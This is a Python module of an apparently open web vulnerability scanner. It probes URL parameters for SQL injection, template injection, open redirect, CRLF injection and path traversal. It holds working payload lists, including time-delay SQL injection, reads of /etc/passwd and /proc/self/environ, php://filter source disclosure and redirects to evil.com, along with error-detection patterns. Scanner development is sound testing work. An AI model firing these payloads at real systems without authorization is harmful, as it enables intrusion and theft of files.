#!/usr/bin/env python3
"""
XSSForge BAV (Basic Another Vulnerability) Module

Detects additional vulnerabilities alongside XSS:
- SQL Injection (SQLi) - Error-based detection
- Server-Side Template Injection (SSTI) - Template evaluation
- Open Redirect - URL redirection
- CRLF Injection - Header injection
- Path Traversal - Directory traversal

This addresses a key Dalfox feature that XSSForge was missing.
"""

import re
from dataclasses import dataclass
from typing import Optional
from enum import Enum


class BAVType(Enum):
    SQLI = "sqli"
    SSTI = "ssti"
    OPEN_REDIRECT = "open_redirect"
    CRLF = "crlf"
    PATH_TRAVERSAL = "path_traversal"
    LFI = "lfi"
    SSRF = "ssrf"


@dataclass
class BAVFinding:
    """BAV vulnerability finding."""
    vuln_type: BAVType
    url: str
    param: str
    payload: str
    evidence: str
    severity: str = "medium"

    def to_json(self) -> dict:
        return {
            "type": self.vuln_type.value,
            "url": self.url,
            "param": self.param,
            "payload": self.payload,
            "evidence": self.evidence,
            "severity": self.severity,
        }

    def __str__(self):
        return f"[BAV-{self.vuln_type.value.upper()}] {self.url} | {self.param}={self.payload[:30]}"


# ============================================================================
# SQL Injection Detection
# ============================================================================

SQLI_PAYLOADS = [
    # Error-based payloads
    "'",
    "''",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "\" OR \"1\"=\"1",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1; SELECT 1",
    "'; WAITFOR DELAY '0:0:5'--",
    "'; SELECT SLEEP(5)--",
    # Time-based (quick version)
    "1' AND SLEEP(2)--",
    "1') AND SLEEP(2)--",
]

SQLI_ERROR_PATTERNS = [
    # MySQL
    r"you have an error in your sql syntax",
    r"warning.*mysql",
    r"mysql_fetch",
    r"mysql_num_rows",
    r"mysql_query",
    r"mysqli_",
    r"mysqlnd",
    # PostgreSQL
    r"postgresql.*error",
    r"pg_query",
    r"pg_exec",
    r"psql.*error",
    r"unterminated quoted string",
    # SQL Server
    r"microsoft.*odbc.*sql server",
    r"mssql_",
    r"sql server.*error",
    r"unclosed quotation mark",
    r"\[sql server\]",
    # Oracle
    r"ora-\d{5}",
    r"oracle.*error",
    r"oracle.*driver",
    r"quoted string not properly terminated",
    # SQLite
    r"sqlite.*error",
    r"sqlite3_",
    r"sqlite\.exception",
    # Generic
    r"sql syntax.*error",
    r"syntax error.*sql",
    r"invalid query",
    r"sql command not properly ended",
    r"unexpected end of sql command",
    r"invalid sql statement",
    r"database error",
    r"db error",
]


def detect_sqli(body: str, original_body: str = "") -> Optional[str]:
    """Detect SQL injection based on error messages."""
    body_lower = body.lower()

    for pattern in SQLI_ERROR_PATTERNS:
        if re.search(pattern, body_lower):
            # Make sure error wasn't in original response
            if original_body and re.search(pattern, original_body.lower()):
                continue
            return pattern

    return None


# ============================================================================
# SSTI Detection
# ============================================================================

SSTI_PAYLOADS = [
    # Jinja2 / Twig
    ("{{7*7}}", "49"),
    ("{{7*'7'}}", "7777777"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    # More complex
    ("{{config}}", "config"),
    ("{{self}}", "TemplateReference"),
    ("${T(java.lang.Runtime)}", "java.lang.Runtime"),
    # Freemarker
    ("${7*7}", "49"),
    ("<#assign x=7*7>${x}", "49"),
    # Velocity
    ("#set($x=7*7)$x", "49"),
    # Smarty
    ("{php}echo 7*7;{/php}", "49"),
    ("{7*7}", "49"),
    # Mako
    ("${7*7}", "49"),
    # Pebble
    ("{{7*7}}", "49"),
]


def detect_ssti(body: str, payload: str, expected: str) -> bool:
    """Detect SSTI by checking if template was evaluated."""
    # Check if the expected result appears in the response
    # but the raw payload doesn't (indicating evaluation)
    if expected in body:
        # Make sure it's not just reflected as-is
        if payload not in body:
            return True
        # Could be both evaluated AND reflected - still vulnerable
        # Check if expected appears more than the payload
        if body.count(expected) > body.count(payload):
            return True
    return False


# ============================================================================
# Open Redirect Detection
# ============================================================================

OPEN_REDIRECT_PAYLOADS = [
    # Basic
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "////evil.com",
    # Protocol-relative
    "https:evil.com",
    "//evil.com/%2f..",
    # Bypass attempts
    "https://evil.com?trusted.com",
    "https://trusted.com@evil.com",
    "https://evil.com#trusted.com",
    "//evil.com/trusted.com",
    "///evil.com",
    "\\\\evil.com",
    # Data/javascript (also XSS)
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    # Encoded
    "https:%2f%2fevil.com",
    "//evil%E3%80%82com",  # Unicode dot
]


def detect_open_redirect(headers: dict, body: str, payload: str) -> bool:
    """Detect open redirect vulnerabilities."""
    # Check Location header
    location = headers.get("location", headers.get("Location", ""))
    if location:
        # Check if our payload is in the redirect location
        payload_domain = "evil.com"
        if payload_domain in location.lower():
            return True
        # Check for exact payload
        if payload in location:
            return True

    # Check for meta refresh
    if f'url={payload}' in body.lower() or f"url='{payload}'" in body.lower():
        return True

    # Check for JavaScript redirect
    redirect_patterns = [
        rf'location\s*=\s*["\']?{re.escape(payload)}',
        rf'location\.href\s*=\s*["\']?{re.escape(payload)}',
        rf'location\.replace\s*\(\s*["\']?{re.escape(payload)}',
        rf'window\.location\s*=\s*["\']?{re.escape(payload)}',
    ]
    for pattern in redirect_patterns:
        if re.search(pattern, body, re.IGNORECASE):
            return True

    return False


# ============================================================================
# CRLF Injection Detection
# ============================================================================

CRLF_PAYLOADS = [
    "%0d%0aX-Injected: header",
    "%0aX-Injected: header",
    "%0dX-Injected: header",
    "\r\nX-Injected: header",
    "\nX-Injected: header",
    "%E5%98%8A%E5%98%8DX-Injected: header",  # Unicode CRLF
    "%0d%0a%0d%0a<html>",  # HTTP response splitting
    "%%0d0a",  # Double encoding
]


def detect_crlf(headers: dict) -> Optional[str]:
    """Detect CRLF injection in response headers."""
    for header_name, header_value in headers.items():
        if header_name.lower() == "x-injected":
            return f"Injected header found: {header_name}: {header_value}"
    return None


# ============================================================================
# Path Traversal / LFI Detection
# ============================================================================

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd",
    "....\\....\\....\\windows\\win.ini",
    "..\\..\\..\\windows\\win.ini",
    "/proc/self/environ",
    "php://filter/convert.base64-encode/resource=index.php",
    "file:///etc/passwd",
]

PATH_TRAVERSAL_INDICATORS = [
    r"root:.*:0:0:",  # /etc/passwd
    r"\[extensions\]",  # win.ini
    r"\[fonts\]",  # win.ini
    r"HTTP_USER_AGENT",  # /proc/self/environ
    r"<\?php",  # PHP source code
]


def detect_path_traversal(body: str) -> Optional[str]:
    """Detect path traversal / LFI vulnerabilities."""
    for pattern in PATH_TRAVERSAL_INDICATORS:
        match = re.search(pattern, body)
        if match:
            return f"File content detected: {match.group()[:50]}"
    return None


# ============================================================================
# BAV Scanner Class
# ============================================================================

class BAVScanner:
    """
    Scan for Basic Another Vulnerabilities.

    This matches Dalfox's --use-bav feature.
    """

    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self.findings: list[BAVFinding] = []

    async def scan(self, client, url: str, param: str, original_body: str = "") -> list[BAVFinding]:
        """Scan a single URL parameter for BAV vulnerabilities."""
        findings = []

        # SQLi detection
        sqli_finding = await self._scan_sqli(client, url, param, original_body)
        if sqli_finding:
            findings.append(sqli_finding)

        # SSTI detection
        ssti_finding = await self._scan_ssti(client, url, param)
        if ssti_finding:
            findings.append(ssti_finding)

        # Open Redirect detection
        redirect_finding = await self._scan_open_redirect(client, url, param)
        if redirect_finding:
            findings.append(redirect_finding)

        # CRLF detection
        crlf_finding = await self._scan_crlf(client, url, param)
        if crlf_finding:
            findings.append(crlf_finding)

        # Path Traversal detection
        lfi_finding = await self._scan_path_traversal(client, url, param)
        if lfi_finding:
            findings.append(lfi_finding)

        self.findings.extend(findings)
        return findings

    async def _scan_sqli(self, client, url: str, param: str, original_body: str) -> Optional[BAVFinding]:
        """Scan for SQL injection."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        for payload in SQLI_PAYLOADS[:5]:  # Quick scan - top 5 payloads
            try:
                test_url = self._inject(url, param, payload)
                r = await client.get(test_url, follow_redirects=True)

                evidence = detect_sqli(r.text, original_body)
                if evidence:
                    return BAVFinding(
                        vuln_type=BAVType.SQLI,
                        url=test_url,
                        param=param,
                        payload=payload,
                        evidence=evidence,
                        severity="high",
                    )
            except:
                pass

        return None

    async def _scan_ssti(self, client, url: str, param: str) -> Optional[BAVFinding]:
        """Scan for SSTI."""
        for payload, expected in SSTI_PAYLOADS[:5]:  # Quick scan
            try:
                test_url = self._inject(url, param, payload)
                r = await client.get(test_url, follow_redirects=True)

                if detect_ssti(r.text, payload, expected):
                    return BAVFinding(
                        vuln_type=BAVType.SSTI,
                        url=test_url,
                        param=param,
                        payload=payload,
                        evidence=f"Template evaluated: {payload} -> {expected}",
                        severity="critical",
                    )
            except:
                pass

        return None

    async def _scan_open_redirect(self, client, url: str, param: str) -> Optional[BAVFinding]:
        """Scan for open redirect."""
        for payload in OPEN_REDIRECT_PAYLOADS[:5]:
            try:
                test_url = self._inject(url, param, payload)
                r = await client.get(test_url, follow_redirects=False)  # Don't follow!

                if detect_open_redirect(dict(r.headers), r.text, payload):
                    return BAVFinding(
                        vuln_type=BAVType.OPEN_REDIRECT,
                        url=test_url,
                        param=param,
                        payload=payload,
                        evidence=f"Redirect to external domain detected",
                        severity="medium",
                    )
            except:
                pass

        return None

    async def _scan_crlf(self, client, url: str, param: str) -> Optional[BAVFinding]:
        """Scan for CRLF injection."""
        for payload in CRLF_PAYLOADS[:3]:
            try:
                test_url = self._inject(url, param, payload)
                r = await client.get(test_url, follow_redirects=True)

                evidence = detect_crlf(dict(r.headers))
                if evidence:
                    return BAVFinding(
                        vuln_type=BAVType.CRLF,
                        url=test_url,
                        param=param,
                        payload=payload,
                        evidence=evidence,
                        severity="medium",
                    )
            except:
                pass

        return None

    async def _scan_path_traversal(self, client, url: str, param: str) -> Optional[BAVFinding]:
        """Scan for path traversal / LFI."""
        for payload in PATH_TRAVERSAL_PAYLOADS[:3]:
            try:
                test_url = self._inject(url, param, payload)
                r = await client.get(test_url, follow_redirects=True)

                evidence = detect_path_traversal(r.text)
                if evidence:
                    return BAVFinding(
                        vuln_type=BAVType.LFI,
                        url=test_url,
                        param=param,
                        payload=payload,
                        evidence=evidence,
                        severity="critical",
                    )
            except:
                pass

        return None

    def _inject(self, url: str, param: str, value: str) -> str:
        """Inject value into URL parameter."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))


# Convenience function
async def scan_bav(client, url: str, params: list[str], original_body: str = "") -> list[BAVFinding]:
    """Quick BAV scan on URL with given parameters."""
    scanner = BAVScanner()
    findings = []
    for param in params:
        findings.extend(await scanner.scan(client, url, param, original_body))
    return findings
